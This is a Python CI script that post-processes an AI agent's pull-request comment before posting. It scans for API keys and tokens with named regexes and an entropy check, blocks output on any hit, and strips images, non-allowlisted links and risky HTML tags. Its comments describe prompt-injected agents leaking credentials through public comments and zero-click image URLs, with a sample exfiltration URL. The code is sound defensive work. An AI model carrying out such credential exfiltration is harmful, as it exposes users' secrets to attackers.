#!/usr/bin/env python3
# M4 (ADR-0005) — deterministic, LLM-free, fail-closed output post-processor.
#
# Runs on the rendered PUBLIC body (the text bound for a PR comment / job
# summary) AFTER render-stage-comment.py and BEFORE any posting step:
#
#   1. Secret scan  -> FAIL the stage (exit 1) on any hit. Nothing is posted.
#      This is the control that actually stops "Comment and Control" (a
#      prompt-injected agent emitting a credential into a public comment).
#   2. URL / HTML neutralize -> strip outbound-exfil vectors (zero-click
#      markdown images, non-allowlisted links, dangerous HTML tags) and emit
#      the scrubbed body for the posting steps to consume.
#
# Schema validation of stage-output.json happens upstream in the renderer;
# this gate guards the rendered surface, not the artifact shape. It is
# intentionally LLM-free and dependency-free (stdlib only) so it is
# deterministic and auditable.
#
# I/O: reads the candidate body from env BODY (falls back to stdin). On pass,
# writes the scrubbed body to GITHUB_OUTPUT as `comment`. Exit 1 = fail-closed.

import math
import os
import re
import sys
import urllib.parse
from collections import Counter


def notice(m):
    sys.stderr.write(f"::notice::{m}\n")


def err(m):
    sys.stderr.write(f"::error::{m}\n")


body = os.environ.get("BODY")
if body is None:
    body = sys.stdin.read()

# --- 1. Secret scan (named patterns) ---------------------------------------
# Scanned on the RAW body first, so a secret hidden in a URL query
# (e.g. ![](http://x/?d=sk-ant-…)) is caught before the URL is neutralized.
SECRET_PATTERNS = {
    "anthropic-key":     r"sk-ant-[A-Za-z0-9_\-]{20,}",
    "openai-style-key":  r"\bsk-[A-Za-z0-9]{32,}\b",
    "aws-access-key":    r"\b(?:AKIA|ASIA)[0-9A-Z]{16}\b",
    "github-token":      r"\bgh[pousr]_[A-Za-z0-9]{36,}\b",
    "github-fine-pat":   r"\bgithub_pat_[A-Za-z0-9_]{60,}\b",
    "slack-token":       r"\bxox[baprs]-[A-Za-z0-9-]{10,}\b",
    "jwt":               r"\beyJ[A-Za-z0-9_\-]{10,}\.eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\b",
    "private-key-block": r"-----BEGIN (?:[A-Z ]+ )?PRIVATE KEY-----",
}

hits = [name for name, pat in SECRET_PATTERNS.items() if re.search(pat, body)]


def shannon(s):
    n = len(s)
    if n == 0:
        return 0.0
    return -sum((c / n) * math.log2(c / n) for c in Counter(s).values())


# High-entropy backstop for unstructured tokens (e.g. a Jira PAT). Guarded
# against the common non-secret shapes our comments legitimately carry:
# pure hex (git SHAs / hashes) and pure-digit run ids. Requires a mixed
# charset + entropy >= 4.0 bits/char to count, to keep false-positives low.
if os.environ.get("HIGH_ENTROPY_SCAN", "true") != "false":
    for tok in re.findall(r"[A-Za-z0-9+/=_\-]{32,}", body):
        if re.fullmatch(r"[0-9a-fA-F]{32,64}", tok) or tok.isdigit():
            continue
        if (any(c.isupper() for c in tok) and any(c.islower() for c in tok)
                and any(c.isdigit() for c in tok) and shannon(tok) >= 4.0):
            hits.append("high-entropy-token")
            break

if hits:
    err(
        f"M4 secret scan: output contains likely secret(s) {sorted(set(hits))}. "
        "Output BLOCKED — nothing posted to the PR or job summary. This is the "
        "fail-closed control against prompt-injection credential exfiltration "
        "('Comment and Control'). Inspect the run artifact (not the log) to triage."
    )
    sys.exit(1)

# --- 2. URL / HTML neutralize ----------------------------------------------
server = os.environ.get("GITHUB_SERVER_URL", "https://github.com")
allow_hosts = {urllib.parse.urlparse(server).netloc.lower(), "github.com"}


def host_allowed(url):
    try:
        h = urllib.parse.urlparse(url.strip()).netloc.lower()
    except ValueError:
        return False
    return bool(h) and any(h == a or h.endswith("." + a) for a in allow_hosts)


# Images are zero-click outbound fetches — neutralize unconditionally
# (we never legitimately embed an image in a stage comment). Done first so the
# link pass below cannot re-match the image's `](url)` tail.
scrubbed = re.sub(r"!\[([^\]]*)\]\([^)]*\)",
                  r"[image removed by output filter: \1]", body)


# Links: keep the text; keep the URL only when its host is allowlisted (so the
# trusted `[Run details](https://github.com/…)` footer survives).
def link_repl(m):
    text, url = m.group(1), m.group(2)
    return m.group(0) if host_allowed(url) else f"{text} (link removed by output filter)"


scrubbed = re.sub(r"\[([^\]]*)\]\(([^)]*)\)", link_repl, scrubbed)

# Bare autolinks and outbound-capable HTML tags.
scrubbed = re.sub(r"<https?://[^>]*>", "(link removed by output filter)",
                  scrubbed, flags=re.I)
DANGEROUS_TAGS = "img|a|script|iframe|object|embed|link|video|audio|source|svg|base|form|meta|style"
scrubbed = re.sub(rf"</?(?:{DANGEROUS_TAGS})\b[^>]*>", "", scrubbed, flags=re.I)

# --- emit ------------------------------------------------------------------
out_path = os.environ.get("GITHUB_OUTPUT")
if out_path:
    with open(out_path, "a") as f:
        f.write("comment<<__SDLC_M4_EOF__\n")
        f.write(scrubbed if scrubbed.endswith("\n") else scrubbed + "\n")
        f.write("__SDLC_M4_EOF__\n")
else:
    sys.stdout.write(scrubbed)

notice(f"M4 output filter passed: no secrets; URLs/HTML neutralized "
       f"({len(body)} -> {len(scrubbed)} chars).")